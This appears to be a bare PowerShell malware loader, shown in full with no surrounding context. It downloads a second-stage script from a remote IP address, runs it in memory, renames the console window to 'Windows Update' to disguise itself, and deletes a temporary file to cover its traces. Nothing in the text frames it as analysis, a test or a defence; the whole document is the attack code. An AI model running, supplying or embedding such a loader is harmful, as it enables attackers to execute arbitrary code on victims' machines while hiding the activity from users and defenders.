
try { $RemoteScript = (iwr "https://198.51.100.24/stage2.ps1" -UseBasicParsing).Content; [ScriptBlock]::Create($RemoteScript).Invoke(); $Host.UI.RawUI.WindowTitle = "Windows Update"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Loader step failed" }
